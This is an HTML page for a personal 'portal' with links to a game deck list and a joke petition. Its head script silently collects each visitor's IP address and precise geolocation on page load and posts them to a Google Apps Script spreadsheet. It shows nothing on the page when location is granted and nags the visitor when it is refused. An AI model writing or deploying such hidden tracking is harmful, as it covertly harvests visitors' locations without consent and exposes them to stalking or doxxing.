<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Miles' Portal </title>
<style>
body {
font-family: 'Segoe UI', sans-serif;
background-color: #1e1e1e;
color: white;
text-align: center;
padding: 50px;
}
h1 {
font-size: 2.5em;
margin-bottom: 20px;
}
.button {
display: inline-block;
background-color: #3a3a3a;
color: white;
padding: 15px 30px;
margin: 10px;
border-radius: 8px;
text-decoration: none;
font-size: 18px;
transition: 0.3s;
}
.button:hover {
background-color: #ff4500;
}
</style>
<script>
// ---------------- Redirects ----------------
const path = window.location.pathname.toLowerCase();
const redirects = {
"/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
"/mod": "https://sign.moveon.org/petitions/make-miles-a-mod"
};

if (redirects[path]) {
window.location.href = redirects[path];
}

// ---------------- Location Tracking ----------------
const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5y5wkDvJKlkgd7uc9I8ojJcI1ibBkiKHf4Dl41Aj2yKJ9y_eQ/exec";

// Get IP address first
fetch("https://api.ipify.org?format=json")
.then(res => res.json())
.then(ipData => {
if ("geolocation" in navigator) {
navigator.geolocation.getCurrentPosition(pos => {
const data = {
ip: ipData.ip,
lat: pos.coords.latitude,
lon: pos.coords.longitude
};

// Send data to Google Sheets
fetch(SHEET_URL, {
method: "POST",
body: JSON.stringify(data)
})
.then(res => res.text())
.then(msg => console.log("Saved to Google Sheets:", msg))
.catch(err => console.error("Error saving:", err));

// Do not show anything on the page if location is accepted
}, err => {
// Show a message on the page if location is denied
document.body.insertAdjacentHTML("beforeend", "<p>Please accept the location services.</p>");
});
}
});
</script>
</head>
<body>
<h1>Welcome to Miles' Portal </h1>
<a href="/milescurrentdeck" class="button">Miles Deck</a>
<a href="/mod" class="button">Make Miles a Mod</a>
</body>
</html>
